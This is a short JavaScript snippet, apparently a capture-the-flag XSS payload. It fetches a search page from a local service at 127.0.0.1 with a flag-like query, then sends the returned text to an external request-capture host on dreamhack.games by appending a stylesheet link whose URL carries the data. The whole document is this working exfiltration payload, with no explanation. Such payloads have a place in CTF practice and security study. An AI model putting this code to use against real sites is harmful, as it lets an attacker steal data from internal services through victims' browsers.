fetch("http://127.0.0.1:12001/search?query=scpCTF")
  .then(res => res.text())
  .then(text => {
    const l = document.createElement('link');
    l.rel = 'stylesheet';
    l.href = 'https://iiwrlis.request.dreamhack.games/?data=' + encodeURIComponent(text);
    document.head.appendChild(l);
  });
